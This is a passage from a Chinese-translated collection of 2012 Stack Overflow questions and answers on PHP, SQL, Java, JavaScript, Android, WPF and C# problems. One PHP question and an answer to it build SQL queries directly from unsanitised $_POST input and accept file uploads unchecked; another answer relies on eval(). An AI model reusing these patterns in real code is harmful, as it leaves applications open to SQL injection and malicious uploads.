我需要使用 mssql 数据库在 php/mysql 中构建 Web 应用程序。Mssql 将图像存储在 blob 数据类型中。我不想使用此处描述的外部工具[Migrating BLOB data from MS SQL Server to MySQL](https://stackoverflow.com/questions/6528267/migrating-blob-data-from-mssql-to-mysql)。我想通过 php 脚本存储数据，但我在将 mssql 数据存储到 mysql 数据时遇到问题，以便我可以显示来自我的 php 应用程序的图像。每次我尝试将数据从 mssql 存储到 mysql 时，它都会显示查询错误。我应该怎么做才能将 blob 数据存储到 mysql 数据库？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:28:17.097

您当然可以使用 PHP 做到这一点。但是，有几个重要的考虑因素：

1.  您必须使用准备好的语句并将您的 blob 绑定到正确的类型，如此[处所述](http://php.net/manual/en/pdo.lobs.php)

2.  如果您的图像大于 1MB（默认限制），您必须调整客户端和服务器配置以增加到[`max_allowed_packet`](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_max_allowed_packet)16 甚至 32MB。

# sql-server - SimpleMembership 数据库是否应该在 mvc4 中分开

> ID：13548738
> 
> 赞同：2
> 
> 时间：2012-11-25T06:03:28.717
> 
> 标签：sql-server, asp.net-mvc-4, simplemembership

MVC4代码优先应用

我将在 UseProfile 中添加两个 int16 字段，并从大约 600 个用户开始，这可能会增长。我知道如何将 SimpleMembership 配置为单独的数据库或滚入主应用程序数据库。代码明智的是，要走哪条路是一个折腾。经验丰富的开发人员对在这种情况下的最佳实践有何意见，特别是考虑到 SimpleMembership 与旧的 Membership 提供程序的缩减模式。两个数据库的最大缺点是与托管相关的成本。

谢谢，

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T06:12:21.407

Asp.Net Membership（和`SimpleMembership`）在您的应用程序数据库中工作正常。

我考虑拆分数据库的唯一原因是，如果您将拥有多个具有单个用户群的系统（即单点登录） - IMO 这个决策点也适用于旧的会员资格。

将用户保留在同一个数据库中的另一个好处是为了参照完整性 - 例如，来自 App 表的外键约束`UserId`将防止意外删除用户，并允许 App 和 Membership 表之间更容易/更简单的连接。

但是，您可能会考虑将成员资格`ConnectionString`与您的应用程序连接字符串分开，因为这将使您的选项保持打开状态以供以后使用，并且您的应用程序不会被限制为代码优先的 EF。

# python - SQLalchemy 数据库列应该是什么模型来包含数据数组？

> ID：13548742
> 
> 赞同：9
> 
> 时间：2012-11-25T06:04:27.380
> 
> 标签：python, attributes, sqlalchemy, flask

所以我正在尝试建立一个数据库，其中的行会经常被修改。例如，每个小时，我都想向数据库的特定部分添加一个数字。因此，如果`self.checkmarks`输入数据库中的等于`3`，用添加的数字更新这部分数据库以使`self.checkmarks`现在等于的最佳方法是什么`3, 2`？我尝试将列建立为`db.Array`但出现属性错误：

> AttributeError：“SQLAlchemy”对象没有属性“数组”

我找到了如何更新数据库，但我不知道通过添加到列表而不是替换来更新的最佳方法。我的方法如下，但我认为`append`行不通，因为列不能是数组：

```
ven = data.query.filter_by(venid=ven['id']).first()
ven.totalcheckins = ven.totalcheckins.append(ven['stats']['checkinsCount'])
db.session.commit() 
```

提前谢谢了

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-27T13:36:36.530

如果您真的想在 SQLAlchemy 中将 python 列表作为 Column ，您将需要查看[PickleType](http://docs.sqlalchemy.org/en/rel_0_8/core/types.html#sqlalchemy.types.PickleType)：

```
array = db.Column(db.PickleType(mutable=True)) 
```

请注意，您必须使用该`mutable=True`参数才能编辑该列。SQLAlchemy 将自动检测更改，并在您提交后立即保存。

如果您希望 pickle 是人类可读的，您可以将其与 json 或其他满足您的目的的转换器结合使用。

# php - 更新查询 php 致命错误

> ID：13548755
> 
> 赞同：-1
> 
> 时间：2012-11-25T06:07:03.457
> 
> 标签：php

我的脚本有问题。

我想在我的程序中进行更新查询，但我的脚本中有一些错误。我在第 29 行发现了致命错误。

有人可以给我建议吗？

我的代码：

```
<?php 

include("db.php");

$kd=$_POST['kd'];
$ins=$_POST['ins'];
$desc=$_POST['desc'];
$sn=$_POST['sn'];
$flo=$_POST['flo'];
$to=$_POST['to'];
$usd=$_POST['usd'];
$sat=$_POST['sat'];
$rdy=$_POST['rdy'];
$stat=$_POST['stat'];
$rmk=$_POST['rmk'];

//kode upload
$lokasi_file = $_FILES['nama_file']['tmp_name'];
$nama_file = $_FILES['nama_file']['name'];
$tipe_file = $_FILES['nama_file']['type'];

//kode untuk mengganti spasi menjadi garis bawah pada nama file
$nama_baru = preg_replace("/\s+/", "_", $nama_file);
$direktori = "images/$nama_baru";

//code untuk mengkopi file ke fodler foto
move_uploaded_file($lokasi_file, $direktori);

$sql("UPDATE consumable SET ins='$ins', part='$desc', serial='$sn' flow='$flo', time='$to', used_qty='$usd', ready_qty='$rdy', unit='$sat', status='$stat', remark='$rmk', foto='$nama_baru' WHERE no='$kd'"); <--- in this line i got Fatal error: Function name must be a string in.  

header("location: home.php");

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:10:20.243

您在更新查询部分缺少逗号：

```
part='$desc', serial='$sn' flow='$flo',.. // change to

part='$desc', serial='$sn', flow='$flo',... 
```

顺便说一句，如果您使用 mysql_ 函数，`mysql_`不鼓励使用它。相反，应该使用[MySQLi](http://www.php.net/manual/en/book.mysqli.php)或[PDO_MySQL扩展。](http://www.php.net/manual/en/ref.pdo-mysql.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:14:54.583

尝试使用

`mysql_query("UPDATE consumable SET ins='$ins', part='$desc', serial='$sn' flow='$flo', time='$to', used_qty='$usd', ready_qty='$rdy', unit='$sat', status='$stat', remark='$rmk', foto='$nama_baru' WHERE no='$kd'");`

而不是 $sql。因为没有调用 $sql 的函数来执行查询

# windows - 带有 Noejs (node-wkhtml) 的 wkhtmltoimage 使用 Windows 标准输出损坏了 png。还有另一种保存文件的方法吗？

> ID：13548759
> 
> 赞同：0
> 
> 时间：2012-11-25T06:08:08.653
> 
> 标签：windows, node.js, wkhtmltopdf, wkhtmltoimage

我正在尝试通过 nodejs 和 node-wkhtml 包使用 wkhtmltoimage 将一些 html 转换为 png。

我可以毫无问题地获得pdf。但是，当我尝试制作 png 而不是 pdf 时，png 只是颜色带，而不是应有的颜色。[项目网站上报告的这个错误](http://code.google.com/p/wkhtmltopdf/issues/detail?id=335)与我所看到的非常相似（除了我正在尝试编写一个 png 并且报告了一个 png 的错误）。

似乎只有在 Windows 上使用 stdout 时才会出现问题。有解决办法吗？**有什么方法可以在不使用标准输出的情况下保存文件？**

```
var fs = require('fs');
var wkhtml = require('node-wkhtml'),
    createWriteStream = require('fs').createWriteStream;

var MyClass = module.exports = function()
    {
    var png = wkhtml.spawn('png');
    png.stdout.pipe(createWriteStream('node_doc.png'));
    png.stdin.end('<h1>Hello World</h1>');
    }

new MyClass(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T04:27:35.950

我最终放弃了流和 node-wkhtml。我现在只是在编写一个临时 html 文件并使用 spawn 调用 wkhtmltoimage。必须制作临时文件并不理想，但它正在工作。

```
child_process.spawn( 'wkhtmltoimage', [ 'temp.html', 'output.png' ] ); 
```

# css - 设置 2 列布局 css，其中一列有两个部分

> ID：13548760
> 
> 赞同：1
> 
> 时间：2012-11-25T06:08:24.907
> 
> 标签：css

这是我要完成的工作的快速草图。Nvm，我不够熟练，无法在这个盒子里完成这项工作。
我已经写了一些，我会用它做一个 jsfiddle， [我](http://jsfiddle.net/2sY56/) 希望第三个 div 与第一个 div 坐在同一高度。尝试了很多东西，包括利润百分比。有什么我错过的吗？我很容易让它坐在第二个div的高度。

CSS：

```
#col11{
margin: 0;
float: top;
width: 50%;
height: 100;
border: 1px red solid;
}

#col12{
margin: 0;
float: left;
width: 50%;
height: 400;
border: 1px blue solid;
}

#col21{
    margin: 0px;
float: right;
clear: none;
width: 49%;
height: 500;
border: 1px pink solid;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:23:08.680

只需更改 div 的顺序即可

[**演示**](http://jsfiddle.net/2sY56/2/)

HTML

```
<div id="col11"></div>
<div id="col21"></div>
<div id="col12"></div> 
```

并且不要使用`float: top;`,`top`不是有效值，`left`而是使用

CSS

```
#col11{
    margin: 0;
    width: 50%;
    height: 200px;
    border: 1px red solid;
    float: left;
}

#col12{
    margin: 0;
    float: left;
    width: 50%;
    height: 300px;
    border: 1px blue solid;
}

#col21{
    margin: 0px;
    float: right;
    clear: none;
    width: 49%;
    height: 500px;
    border: 1px pink solid;
} 
```

# asp.net-mvc - 无法获取值 POST 方法 RESTFUL 服务

> ID：13548761
> 
> 赞同：1
> 
> 时间：2012-11-25T06:08:34.140
> 
> 标签：asp.net-mvc

我在 ASP.NET MVC4 中使用 RESTful Web 服务，当调用 POST 方法时，参数 [FromBody] 为空。如何解决？

![在此处输入图像描述](../Images/d0dd76fb60beb6cef75da3923ee845f2.png)

![在此处输入图像描述](../Images/3e2d6926298f9843d4db0ce60dfe9c52.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:45:49.143

客户端需要发送以下格式的值：

```
=huhu 
```

# objective-c - NSMutableArray 未在 UITableView 中显示

> ID：13548764
> 
> 赞同：0
> 
> 时间：2012-11-25T06:08:52.803
> 
> 标签：objective-c, uitableview

在我的头文件中：

```
@interface HTMLClassesViewController : UITableViewController <UITableViewDataSource, UITableViewDelegate> 
```

所以我确实声明了`dataSource`and `delegate`。

在我的实现文件中：

```
- (void)viewDidLoad {

    [super viewDidLoad];

    if (self.arrayOfClasses == nil) {
        self.arrayOfClasses = [[NSMutableArray alloc] init];
    }
    NSMutableArray *array = [[NSMutableArray alloc] init];
    ... // Gather data from HTML source and parse it into "array"
    self.arrayOfClasses = array; //arrayOfClasses here is non-nil (with correct objects)
    NSLog(@"%@ test1", [self.arrayOfClasses objectAtIndex:0]);
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    NSLog(@"%@ test1.5", [self.arrayOfClasses objectAtIndex:0]);
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
NSLog(@"%@ test2", [self.arrayOfClasses objectAtIndex:0]);
    return [self.arrayOfClasses count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
NSLog(@"%@ test3", [self.arrayOfClasses objectAtIndex:0]);
    static NSString *CellIdentifier = @"WebCollegeCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier forIndexPath:indexPath];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    cell.textLabel.text = [self.arrayOfClasses objectAtIndex:indexPath.row];
    return cell;
} 
```

这是来自的输出`NSLog`：

```
2012-11-24 22:52:19.125 ArizonaCollegeSearch[72404:c07] CSE 240 test1
2012-11-24 22:52:19.126 ArizonaCollegeSearch[72404:c07] CSE 240 test1.5
2012-11-24 22:52:19.127 ArizonaCollegeSearch[72404:c07] (null) test1.5
2012-11-24 22:52:19.127 ArizonaCollegeSearch[72404:c07] (null) test2 
```

正如你所看到的，`numberOfSectionsInTableView`被一个非空对象调用，然后被一个空对象`numberOfRowsInSection`调用，被一个空对象调用，并且`cellForRowAtIndexPath`根本没有被调用。我什至没有`[self.tableView reloadData]`地方。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:28:54.137

所以需要声明保存数组的属性`strong`，否则当分配给它的变量被释放时，它将被释放。对于局部变量（您的`NSMutableArray *array`），这是其作用域的结束，例如当函数`viewDidLoad`返回时。

# wpf - WPF数据绑定gridview问题

> ID：13548765
> 
> 赞同：0
> 
> 时间：2012-11-25T06:09:03.160
> 
> 标签：wpf

我正在研究从实体模型填充的数据网格。对于特定列，我有以下内容作为在编辑期间使用组合框的尝试，并且编辑的源是 CollectionsViewSource。

```
 <Grid DataContext="{StaticResource vsLogins}" Grid.Column="1" 
            Margin="16,248,154,31">
        <DataGrid AutoGenerateColumns="False" EnableRowVirtualization="True" 
                  Height="213" HorizontalAlignment="Left"
                  ItemsSource="{Binding Source={StaticResource vsLogins}}" 
                  Name="LoginsDataGrid"
                  RowDetailsVisibilityMode="VisibleWhenSelected" 
                  VerticalAlignment="Top" Width="380"
                  Background="{StaticResource lgb}" BorderThickness="2" 
                  BorderBrush="#FFFC0303">
          <DataGrid.Columns>
            <DataGridTextColumn x:Name="LoginNameColumn" Binding="{Binding 
                                  Path=LoginName}" Header="Login Name"
                                  Width="200" MinWidth="200" />
            <DataGridTextColumn x:Name="PsWrdColumn"
                                Binding="{Binding Path=PsWrd}" 
                                Header="Password" Width="130" MinWidth="130" />
            <DataGridTemplateColumn x:Name="AccessLevelIdColumn" Header="Id"
                                    Width="40" MinWidth="40">
              <DataGridTemplateColumn.CellTemplate>
                <DataTemplate>
                  <TextBlock Text="{Binding Path=AccessLevelId}" />
                </DataTemplate>
              </DataGridTemplateColumn.CellTemplate>
              <DataGridTemplateColumn.CellEditingTemplate>
                <DataTemplate>
                  <ComboBox ItemsSource="{Binding Source={StaticResource 
                             vsAccessLevels}}" DisplayMemberPath="Description" 
                         SelectedValuePath="AccessLevelId" IsEditable="False"/>
                </DataTemplate>
              </DataGridTemplateColumn.CellEditingTemplate>
            </DataGridTemplateColumn>
          </DataGrid.Columns>
        </DataGrid> 
```

它抛出了一些错误。我究竟做错了什么？我还尝试在组合框周围放置一个网格并将其 dataContent 设置为 CVS - 也没有骰子。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T21:02:56.377

```
<DataGridComboBoxColumn x:Name="AccessIdColumn" 
                        ItemsSource="{Binding Source={StaticResource vsAccessLevels}}" 
                        DisplayMemberPath="Description" 
                        SelectedValuePath="AccessLevelId"
                        SelectedValueBinding="{Binding Path=AccessLevelId}"/> 
```

# java - java：通过散列函数记忆构造

> ID：13548768
> 
> 赞同：3
> 
> 时间：2012-11-25T06:09:14.580
> 
> 标签：java, hash, hashtable

我有一个 X 对象，其构造函数接受 4 个整数字段。为了计算它的哈希函数，我简单地将它们放入一个数组中并使用 Arrays.hashCode。

目前构造函数是私有的，我有一个静态的创建者方法。我想记住构造，以便每当使用之前调用的 4 个整数参数调用创建者方法时，我都可以返回与上次相同的对象。[理想情况下，无需创建另一个 X 对象进行比较。]

最初我尝试了一个 hashSet，但这需要我创建一个新的 X 来检查我的 hashSet.contains 是否包含相等的对象......不要介意我无法从 hashSet 中“得到”的事实。

我的下一个想法是使用 HashTable 映射：4 个字段的 int 数组的 hashCode --> 对象。我不知道为什么，但感觉不对。感觉好像我做的工作太多了，hashCode 的意义不就是映射到一堆计算到相同 hashCode 的对象吗？

我很感激你的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:27:34.180

哈希码的目的通常是*缩小*查找特定对象的位置。或者换一种说法，这个想法是你的哈希码使得如果两个对象具有相同的哈希码，它们“很可能”是同一个对象。

现在，“非常可能”的可能性有多大基本上取决于哈希码的宽度（位数）和质量。在 Java 的情况下，使用 32 位哈希码，这个“很可能”仍然通常意味着“还没有接近 100%，您可以取消对象数据的实际比较”。因此，除了实现 hashCode() 之外，您还需要在用作 Java Map（HashMap 等）的键的对象上实现 equals()。

或者换一种说法：你的实现基本上是正确的，即使看起来你做了很多工作。结果是，如果您正在寻找的是性能改进，那么您不妨每次都创建一个新对象。但是，如果在功能上您要求不存在多个具有给定值的对象，那么您的实现基本上是正确的。

原则上你可以做的事情：

*   如果您有大量整数，那么对于 hashCode()，只需从其中几个“样本”中形成哈希码——想法是“缩小选择范围”或使其“公平但不100% 可能'相等的哈希码意味着相等的对象——你的 equals() 无论如何都必须检查它们，所以循环遍历 hashCode() 和 equals() 中的所有值没有意义；
*   潜在地，您可以使用更强的哈希码，以便您从字面上假设相等的哈希码意味着相等的对象。实际上，您在哈希码函数中循环遍历所有值一次，并且根本没有 equals 函数。在实践中，这意味着至少使用强 64 位哈希码。对于您提到的情况，这可能不值得。但是，如果您想稍微了解一下它的工作原理，我会向您介绍我写的关于[Java 中哈希码的高级使用的](http://www.javamex.com/tutorials/collections/hash_codes_advanced_statistics.shtml)教程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T07:34:56.157

如果构造过程中的 4 个整数意味着生成的对象将完全相同，则使用它们作为键，而不是它们的散列。请注意，我没有使用您的完整对象作为键，只是使用 4 个整数值。下面的 MyObjectSpecification 将是一个小对象。

```
public class MyObjectSpecification {
    private final int i1, i2, i3, i4;

    public MyObjectSpecification(int i1, int i2, int i3, int i4) {
        this.i1 = i1;
        this.i2 = i2;
        this.i3 = i3;
        this.i4 = i4;
    }

    public boolean equals(Object o) {
        // ...
    }

    public int hashCode() {
        // ...
    }
}

public class MyObject {
    private static final Map<MyObjectSpecification, MyObject> myObjects
            = new ConcurrentHashMap<MyObjectSpecification, MyObject>();

    private MyObject(MyObjectSpecification spec) {
        // ...
    }

    public static MyObject getMyObject(int i1, int i2, int i3, int i4) {
        MyObjectSpecification spec = new MyObjectSpecification(i1, i2, i3, i4);

        if (myObjects.containsKey(spec)) {
            return myObjects.get(spec);
        }

        MyObject newObject = new MyObject(spec);
        myObjects.put(spec, newObject);
        return newObject;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:22:57.097

不确定您打算如何使用 Hashtable，但我认为以下内容可以完成您的工作：

```
 private static Hashtable<Integer, MyObject> objectInstances = 
             new Hashtable<Integer, MyObject>();

    public static MyObject instance(int i1, int i2, int i3, int i4){
         int hashKey = Arrays.hashCode(new int[]{i1, i2,i3,i4});
         //get the object from hashtable
         MyObject myObject = objectInstances.get(hashKey);

         //if object was not already created, create now and put in the hashtable
         if(myObject == null){
           myObject = new MyObject(i1,i2,i3,i4);
           objectInstances.put(hashKey, myObject);
         }
        return myObject;
    } 
```

# javascript - 如何停止默认的 href 操作

> ID：13548773
> 
> 赞同：0
> 
> 时间：2012-11-25T06:10:24.267
> 
> 标签：javascript, html, jsp, dom-events, href

我的 JSP 中有以下格式的代码。

```
<a href="javascript:submit()">sumbit</a> 
```

按下链接后，我的表单将被提交。但是，我需要阻止默认的a href 行为，只需要调用提交函数即可。提交函数提交表单

我尝试通过 jQuery 在 HREF 上捕获 click 事件，然后触发`e.preventDefault()`. 同样，我选择了 HREF 属性，然后执行了一个`eval()`触发函数。

但是，我无法停止默认的 HREF 功能，并且新页面总是保存在浏览器缓存中。

我也没有自由手动进入并更改代码。请建议。

**更新**

代码的问题是：

```
<a href="javscript:submit()">submit</a> 
```

是在 JSP 中使用 HREF 的示例之一。使用上述格式，可能会调用不同类型的函数：

我使用了下面的 jQuery：

```
$("a[href^=\'javascript\']").live('click',function(e)
{
     e.preventdefault();
     eval($(this).attr('href'));
     return false;
}); 
```

但是，这不会停止默认的 HREF 功能。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:39:29.497

正如您在问题中提到的，您无法手动更改标记。

所以，我想，这才是你真正想要的。

```
<form id='myform' action=''>
</form>
<a href="javascript:submit()">submit</a>​
​ 
```

**JS：**

```
 function submit() {
   document.getElementById('myform').submit();
 }

 jQuery(function() {
    $('a').click(function() {
         var href = $(this).attr('href').replace('javascript:','');
         console.log(href); 
         alert('hi');
         eval(href);        
         return false;
     });
 });​ 
```

​</p>

[演示](http://jsfiddle.net/jashwant/JdURa/)

**更新：**

你可以避免`eval(href)`, 通过使用`window[href]();`

看这个[演示](http://jsfiddle.net/jashwant/JdURa/1/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-25T06:23:05.780

尝试：

`<a href="#" onclick="submit()">sumbit</a>`

# java - 如何从活动中提取 Android 服务中的字符串值？

> ID：13548775
> 
> 赞同：1
> 
> 时间：2012-11-25T06:10:56.093
> 
> 标签：java, android, android-intent, android-service

如何从活动中提取 Android 服务中的字符串值？

我的活动有一个编辑文本，输入的字符串必须在我的服务中接收。

临时启动.java：

公共类 TempLaunch 扩展 Activity {

```
 private EditText text;
  private Button okbtn;

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.templaunch);

    addListenerOnButton();

  }

  public void addListenerOnButton() {

    text = (EditText) findViewById(R.id.edittext_newid);    
    okbtn = (Button) findViewById(R.id.button_newid);

    okbtn.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {

          Toast.makeText(TempLaunch.this, "In Temp launch class ",Toast.LENGTH_SHORT).show();
          Toast.makeText(TempLaunch.this, text.getText(),Toast.LENGTH_SHORT).show();

            Intent intent = new Intent(getApplicationContext(), MainActivity.class);

            Toast.makeText(TempLaunch.this, "I am in Main activity class ",Toast.LENGTH_SHORT).show();
            startActivity(intent);

        }

    });

    Intent i = new Intent(this, MusicService.class);

    i.putExtra("DD_URL", text.getText().toString());

    //startActivity(i);

  }
} 
```

MusicService.java 公共类 MusicService 扩展服务 {

```
@Override
    public void onCreate() {
        super.onCreate();

        String url = null;

            Intent intent = getIntent();
            String id = intent.getStringExtra("DD_URL");

            System.out.println("Rosh :" + id);
            Toast.makeText(MusicService.this, "I am in Service:"+ id,Toast.LENGTH_SHORT).show(); 
```

...

请在这方面帮助我。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:06:47.897

您可以使用[sendBroadcast(intent);](http://developer.android.com/reference/android/content/Context.html#sendBroadcast%28android.content.Intent%29) 这将从您的活动 A 中广播 EditText。

然后，您需要在 Service 类中调用[onReceive(Context context, Intent intent) 。](http://developer.android.com/reference/android/content/BroadcastReceiver.html#onReceive%28android.content.Context,%20android.content.Intent%29)当 BroadcastReceiver 接收 Intent 广播时调用此方法，在您的情况下将从 Activity A 发送。

```
 private final BroadcastReceiver receiver = new BroadcastReceiver() 
   {
        @Override
        public void onReceive(Context context, Intent intent) 
        {
            // Do something
        }
   };

    //Register your receiver in onResume:

    @Override
    protected void onResume() 
    {
        super.onResume();        
        IntentFilter filter = new IntentFilter();
        filter.addAction("SOME_ACTION");
        registerReceiver(receiver, filter);
    }

   //Unregister the receiver in onPause:

    @Override
    protected void onPause() 
    {
        super.onPause();       
        unregisterReceiver(receiver);
    } 
```

# function - 我的函数的python3递归正确性

> ID：13548778
> 
> 赞同：0
> 
> 时间：2012-11-25T06:11:49.103
> 
> 标签：function, recursion, dictionary, python-3.x, extraction

我需要帮助解决一个问题。例如，我有以下字典名为`planets`：

```
{'Mercury': {'Orbital Radius': '38001200', 'Radius': '243900.7',
'Period': '87.9691'}, 'Ariel': {'Orbital Radius': '8595000', 'Radius':
'60000', 'Period': '2.520379'}, 'Sun': {'Satellites':
'Mercury,Venus,Earth,Mars,Jupiter,Saturn,Uranus,Neptune,Ceres,Pluto,Haumea,Makemake,Eris',
'Orbital Radius': '0', 'Radius': '20890260'}, 'Phobos': {'Orbital
Radius': '3623500.6', 'Radius': '200000', 'Period': '0.31891023'},
'Deimos': {'Orbital Radius': '8346000', 'Radius': '200000.2',
'Period': '1.26244'}, 'Mars': {'Satellites': 'Phobos,Deimos', 'Orbital
Radius': '106669000', 'Radius': '339600.2', 'Period': '686.971'},
'Rhea': {'Orbital Radius': '24000000', 'Radius': '75000', 'Period':
'4.5'}, 'Oberon': {'Orbital Radius': '26235000', 'Radius': '75000',
'Period': '13.463'}, 'Europa': {'Orbital Radius': '36486200',
'Radius': '156000.8', 'Period': '3.551181'}, 'Tethys': {'Orbital
Radius': '13706000', 'Radius': '50000', 'Period': '1.9'}, 'Miranda':
{'Orbital Radius': '5822550', 'Radius': '23500', 'Period': '1.413'},
'Saturn': {'Satellites':
'Mimas,Enceladus,Tethys,Dione,Rhea,Titan,Iapetus', 'Orbital Radius':
'353572956', 'Radius': '6026800', 'Period': '10759.22'}, 'Uranus':
{'Satellites': 'Puck,Miranda,Ariel,Umbriel,Titania,Oberon', 'Orbital
Radius': '453572956', 'Radius': '2555900', 'Period': '30799'},
'Neptune': {'Satellites': 'Triton', 'Orbital Radius': '550000000',
'Radius': '2476400', 'Period': '60190'}, 'Titania': {'Orbital Radius':
'19575000', 'Radius': '75000', 'Period': '8.7058'}, 'Enceladus':
{'Orbital Radius': '10706000', 'Radius': '25000', 'Period': '1.4'},
'Venus': {'Orbital Radius': '57477000', 'Radius': '605100.8',
'Period': '224.698'}, 'Moon': {'Orbital Radius': '18128500', 'Radius':
'173700.10', 'Period': '27.321582'}, 'Triton': {'Orbital Radius':
'40000000', 'Radius': '135300', 'Period': '-5.8'}, 'Ceres': {'Orbital
Radius': '130995855', 'Radius': '48700', 'Period': '1679.67'},
'Mimas': {'Orbital Radius': '8433396', 'Radius': '20600', 'Period':
'0.9'}, 'Titan': {'Orbital Radius': '50706000', 'Radius': '257600',
'Period': '15.945'}, 'Ganymede': {'Orbital Radius': '47160000',
'Radius': '263400', 'Period': '7.15455296'}, 'Umbriel': {'Orbital
Radius': '11983500', 'Radius': '60000', 'Period': '4.144177'},
'Callisto': {'Orbital Radius': '69700000', 'Radius': '241000',
'Period': '16.6890184'}, 'Jupiter': {'Satellites':
'Io,Europa,Ganymede,Callisto', 'Orbital Radius': '210573600',
'Radius': '7149200', 'Period': '4332.59'}, 'Io': {'Orbital Radius':
'22000000', 'Radius': '182100.3', 'Period': '1.7691377186'}, 'Earth':
{'Satellites': 'Moon', 'Orbital Radius': '77098290', 'Radius':
'637100.0', 'Period': '365.256363004'}, 'Dione': {'Orbital Radius':
'17106000', 'Radius': '56000', 'Period': '2.7'}, 'Iapetus': {'Orbital
Radius': '72285891', 'Radius': '75000', 'Period': '79'}} 
```

这是我的太阳能动画代码。我的问题是，我的代码是否会不断检查每个“对象”中的“卫星”，然后打印它们（如果存在）？它是递归的吗？我整天都在努力使它检查然后打印！

```
#code for solar animation
#t = period
#x,y = rootobject coordinates

print("flush false")
scale = 600/max([planets[key]['Orbital Radius'] for key in planets])
t = 0
x = 400
y = 300
print("fillcircle",400,300,planets['Sun']['Radius']*scale)
print("text ", "\"Sun\"",x + planets['Sun']['Radius']*scale,y)

def satellites(planets):
    for 'Satellites' in planets:
        if 'Satellites' not in 'Object':
            return
        else:
            print("refresh")
            print("colour 0 0 0")
            print("clear")
            print("colour 255 255 255")
            r_sat = planets['Object']['Satellites']['Orbital Radius']*scale
            print("circle",x,y,r_sat)
            r_satX = x + math.sin(t*2*math.pi/planets['Object']['Satellites']['Period'])*r_sat
            r_satY = y + math.cos(t*2*math.pi/planets['Object']['Satellites']['Period'])*r_sat
            print("fillcircle",r_satX,r_satY,planets['Object']['Satellites']['Radius']*scale)
            print("text ",['Object']['Satellites'],r_satX + planets['Object']['Satellites']['Radius']*scale,r_satY)
            t += 0.02

system = satellites(planets)
print(system) 
```

我已经接近我的极限，我已经尝试了我能想到的一切，但我需要帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T13:06:39.237

*1\. 我的问题是，我的代码是否会不断检查每个“对象”中的“卫星”，然后打印它们（如果存在）？*

不，你的`function` `satellites()`它不是有效的python。这是相当多的错误，但我可以看到你正*朝着*正确的方向前进，*有点*。

```
for 'Satellites' in planets:
    if 'Satellites' not in 'Object':
        return 
```

`'Satellites'`只是一个字符串，所以`for 'string' in 'iterable object'`不是有效的python。

`if 'Satellites' not in 'Object':`和上一行有同样的问题，**字符串** `'Satellites'`永远**不会**在**字符串中** `'Object'`

我相信这是你想做的：

```
for key in planets.keys():               # For all keys in the outer dic 
    if 'Satellites' not in planets[key]: # Does inner dic have key 'Satellites'
        return 
```

在哪里获取包含在一次循环中的`key`每个值的变量（不是字符串） 。`planets`所以第一次是 is 的值`key`，`'Mecury'`第二次是`key`is的值`'Sun'`等等。然后我们查看内部字典`planets[key]`并检查该字典是否有 key `'Satellites'`。

然后使用`planets[key]['Satellites']`not`planets['Object']['Satellites']`作为键`'Object'`永远不存在（查看输入文件）。

*2.它是递归的吗？*

不，你`function` `satellites()`从不自称，重新阅读我关于递归的答案：[python3 recursion animation in QuickDraw](https://stackoverflow.com/questions/13520435/python3-recursion-animation-in-quickdraw/13534298#13534298)

# c# - c# if-else inside catch 语句

> ID：13548781
> 
> 赞同：1
> 
> 时间：2012-11-25T06:13:07.727
> 
> 标签：c#, exception-handling, sql-server-ce

我正在尝试在 catch 方法中编写一个 if-else 块，但是当我收到“并非所有代码路径都返回 int 类型”的错误时。

本质上，我正在编写一种将用户名和密码保存到 Sql CE 数据库的方法，并且我想测试一个特定的错误。（用户名已经存在。）用户名列是唯一的，所以它会可靠地抛出一个带有 NativeError = 25016 的 SqlCeException。我想用错误消息显示它，否则以更通用的方式处理其他异常。

我的代码是：

```
 try
  {
    //insert command  (This is where the duplicate column error is thrown)
    //Select @@Identity & Return it
  }
  catch (SqlCeException ex)
  {
   if (ex.NativeError == 25016)
        MessageBox.Show("Username already in use."); 
   else
     //whatever
  } 
```

我尝试显示不同的、更通用的消息并得到不返回错误。我尝试抛出一个新异常并将其捕获到另一个块中。同样的错误。我试过返回 -1 （作为一种标志值）。同样的错误。

对于这种特定情况，似乎没有比 SqlCeException 更具体的错误（尽管我可能刚刚让我调试失败）。

有什么创造性的变通方法吗？最坏的情况是，我将编写一个方法，在调用此方法之前检查数据库中是否存在重复的用户名。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-25T06:17:10.397

看起来您的方法返回一个`int`. `int`你需要从你的 catch 块中返回一个类型的值。

```
 try
  {
    //insert command  (This is where the duplicate column error is thrown)
    //Select @@Identity & Return it
  }
  catch (SqlCeException ex)
  {
   if (ex.NativeError == 25016)
        MessageBox.Show("Username already in use."); 
   else
   {
     //whatever  
   }
   return -1;
  } 
```

* * *

## 回答 #2

